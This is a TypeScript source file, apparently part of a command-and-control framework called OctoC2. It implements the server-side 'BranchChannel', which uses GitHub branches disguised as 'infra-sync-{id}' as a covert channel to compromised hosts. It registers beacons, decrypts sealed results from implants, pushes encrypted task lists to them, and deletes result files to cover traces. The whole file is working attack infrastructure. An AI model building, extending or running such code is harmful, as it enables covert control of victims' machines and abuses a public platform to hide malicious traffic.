/**
 * OctoC2 Server — BranchChannel
 *
 * Polls dedicated git branches every pollIntervalMs for beacon activity.
 * Each beacon uses a branch named: refs/heads/infra-sync-{id8}
 *
 * Files on the branch:
 *   ack.json              — { ts: <iso>, pubkey: <base64url> }    beacon → server
 *   task.json             — encrypted Task[] blob                  server → beacon
 *   result-{taskId8}.json — sealed TaskResult blob                 beacon → server
 *
 * Crypto:
 *   Incoming results (beacon → server): crypto_box_seal — openSealBox()
 *   Outgoing tasks   (server → beacon): crypto_box      — encryptForBeacon()
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface BranchChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
}

interface AckPayload {
  ts:     string;
  pubkey: string;
}

interface ResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  completedAt: string;
}

export class BranchChannel {
  private timer: ReturnType<typeof setInterval> | null = null;

  /** beaconIds registered via branch ACK files */
  private readonly branchBeacons = new Map<string, string>();  // beaconId → id8

  /** Branch id8 values we've already seen ACK on (to detect updates) */
  private readonly ackShas = new Map<string, string>();  // id8 → last ACK file etag

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     BranchChannelOpts,
  ) {}

  start(): void {
    if (this.timer) return;
    this.timer = setInterval(() => {
      this.poll().catch(err =>
        console.error("[BranchChannel] Poll error:", (err as Error).message)
      );
    }, this.opts.pollIntervalMs);
    console.log("[BranchChannel] Started polling");
  }

  stop(): void {
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
      console.log("[BranchChannel] Stopped");
    }
  }

  private async poll(): Promise<void> {
    const { owner, repo } = this.opts;
    await this.processAckFiles(owner, repo);
    await this.processResultFiles(owner, repo);
    await this.deliverPendingTasks(owner, repo);
  }

  private async processAckFiles(owner: string, repo: string): Promise<void> {
    let refs: any[];
    try {
      const resp = await this.opts.octokit.rest.git.listMatchingRefs({
        owner, repo, ref: "heads/infra-sync-",
      });
      refs = resp.data as any[];
    } catch (err) {
      console.warn("[BranchChannel] Failed to list branches:", (err as Error).message);
      return;
    }

    for (const ref of refs) {
      // Extract id8 from branch name: refs/heads/infra-sync-{id8}
      const match = (ref.ref as string).match(/^refs\/heads\/infra-sync-([a-f0-9\-]+)$/);
      if (!match) continue;
      const id8 = match[1]!;

      try {
        const fileResp = await this.opts.octokit.rest.repos.getContent({
          owner, repo,
          path: "ack.json",
          ref:  ref.ref,
        });
        const data = fileResp.data as any;
        if (data.type !== "file" || !data.content) continue;

        const rawContent = atob(data.content.replace(/\n/g, ""));
        const sha = data.sha as string;

        // Skip if ACK hasn't changed
        if (this.ackShas.get(id8) === sha) continue;
        this.ackShas.set(id8, sha);

        const ack = JSON.parse(rawContent) as AckPayload;
        if (!ack.pubkey) continue;

        const existingBeacon = this.registry.getAll().find(
          b => b.beaconId.startsWith(id8)
        );
        const beaconId = existingBeacon?.beaconId ?? id8;

        this.registry.register({
          beaconId,
          issueNumber: 0,
          publicKey:   ack.pubkey,
          hostname:    "unknown",
          username:    "unknown",
          os:          "unknown",
          arch:        "unknown",
          seq:         0,
        });
        this.branchBeacons.set(beaconId, id8);

        console.log(`[BranchChannel] Registered beacon ${beaconId} from branch infra-sync-${id8}`);
      } catch (err: any) {
        if (err?.status !== 404) {
          console.warn("[BranchChannel] ACK processing error:", (err as Error).message);
        }
      }
    }
  }

  private async processResultFiles(owner: string, repo: string): Promise<void> {
    for (const [beaconId, id8] of this.branchBeacons) {
      const branchRef = `refs/heads/infra-sync-${id8}`;

      let treeItems: any[];
      try {
        const refResp = await this.opts.octokit.rest.git.getRef({
          owner, repo, ref: `heads/infra-sync-${id8}`,
        });
        const headSha = refResp.data.object.sha;

        const commitResp = await this.opts.octokit.rest.git.getCommit({
          owner, repo, commit_sha: headSha,
        });
        const treeResp = await this.opts.octokit.rest.git.getTree({
          owner, repo, tree_sha: commitResp.data.tree.sha,
        });
        treeItems = treeResp.data.tree as any[];
      } catch (err: any) {
        if (err?.status !== 404) {
          console.warn(`[BranchChannel] Failed to list branch tree for ${id8}:`, (err as Error).message);
        }
        continue;
      }

      const resultFiles = treeItems.filter(
        (item: any) => typeof item.path === "string" && item.path.startsWith("result-") && item.path.endsWith(".json")
      );

      for (const item of resultFiles) {
        try {
          const fileResp = await this.opts.octokit.rest.repos.getContent({
            owner, repo,
            path: item.path,
            ref:  branchRef,
          });
          const data = fileResp.data as any;
          if (data.type !== "file" || !data.content) continue;

          const sealed = atob(data.content.replace(/\n/g, "")).trim();
          if (!sealed) continue;

          await _sodium.ready;
          const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);

          const plainBytes = await openSealBox(sealed, operatorPublicKey, this.opts.operatorSecretKey);
          const plain = new TextDecoder().decode(plainBytes);
          const result = JSON.parse(plain) as ResultPayload;

          if (result.taskId) {
            this.queue.markCompleted(result.taskId, plain);
            console.log(`[BranchChannel] Task ${result.taskId} completed (success=${result.success})`);
          }

          await this.deleteFileFromBranch(owner, repo, id8, item.path);
        } catch (err) {
          console.warn("[BranchChannel] Result processing error:", (err as Error).message);
        }
      }
    }
  }

  private async deliverPendingTasks(owner: string, repo: string): Promise<void> {
    for (const [beaconId, id8] of this.branchBeacons) {
      const allPending = this.queue.getPendingTasks(beaconId);
      const pending = allPending.filter(
        t => !t.preferredChannel || t.preferredChannel === "branch"
      );
      if (pending.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) continue;

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(pending.map(t => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        await this.writeFileOnBranch(
          owner, repo, id8,
          "task.json",
          JSON.stringify(encrypted),
          "update",
        );

        for (const t of pending) {
          this.queue.markDelivered(t.taskId);
        }

        console.log(`[BranchChannel] Delivered ${pending.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        console.warn(`[BranchChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }

  private async writeFileOnBranch(
    owner: string, repo: string, id8: string,
    path: string, content: string, message: string,
  ): Promise<void> {
    const branchRefShort = `heads/infra-sync-${id8}`;
    const branchRefFull  = `refs/heads/infra-sync-${id8}`;

    let headSha: string | null = null;
    try {
      const refResp = await this.opts.octokit.rest.git.getRef({
        owner, repo, ref: branchRefShort,
      });
      headSha = refResp.data.object.sha;
    } catch (err: any) {
      if (err?.status !== 404) throw err;
    }

    const blobResp = await this.opts.octokit.rest.git.createBlob({
      owner, repo, content, encoding: "utf-8",
    });

    let baseTreeSha: string | undefined;
    if (headSha) {
      const commitResp = await this.opts.octokit.rest.git.getCommit({
        owner, repo, commit_sha: headSha,
      });
      baseTreeSha = commitResp.data.tree.sha;
    }

    const treeResp = await this.opts.octokit.rest.git.createTree({
      owner, repo,
      ...(baseTreeSha ? { base_tree: baseTreeSha } : {}),
      tree: [{
        path,
        mode: "100644",
        type: "blob",
        sha:  blobResp.data.sha,
      }],
    });

    const commitResp = await this.opts.octokit.rest.git.createCommit({
      owner, repo,
      message,
      tree:    treeResp.data.sha,
      parents: headSha ? [headSha] : [],
    });

    if (headSha) {
      await this.opts.octokit.rest.git.updateRef({
        owner, repo,
        ref:   branchRefShort,
        sha:   commitResp.data.sha,
        force: true,
      });
    } else {
      await this.opts.octokit.rest.git.createRef({
        owner, repo,
        ref: branchRefFull,
        sha: commitResp.data.sha,
      });
    }
  }

  private async deleteFileFromBranch(
    owner: string, repo: string, id8: string, path: string,
  ): Promise<void> {
    const branchRefShort = `heads/infra-sync-${id8}`;

    const refResp = await this.opts.octokit.rest.git.getRef({
      owner, repo, ref: branchRefShort,
    });
    const headSha = refResp.data.object.sha;

    const commitResp = await this.opts.octokit.rest.git.getCommit({
      owner, repo, commit_sha: headSha,
    });

    const treeResp = await this.opts.octokit.rest.git.createTree({
      owner, repo,
      base_tree: commitResp.data.tree.sha,
      tree: [{
        path,
        mode: "100644",
        type: "blob",
        sha:  null,
      }] as any,
    });

    const newCommit = await this.opts.octokit.rest.git.createCommit({
      owner, repo,
      message: "sync",
      tree:    treeResp.data.sha,
      parents: [headSha],
    });

    await this.opts.octokit.rest.git.updateRef({
      owner, repo,
      ref:   branchRefShort,
      sha:   newCommit.data.sha,
      force: true,
    });
  }
}
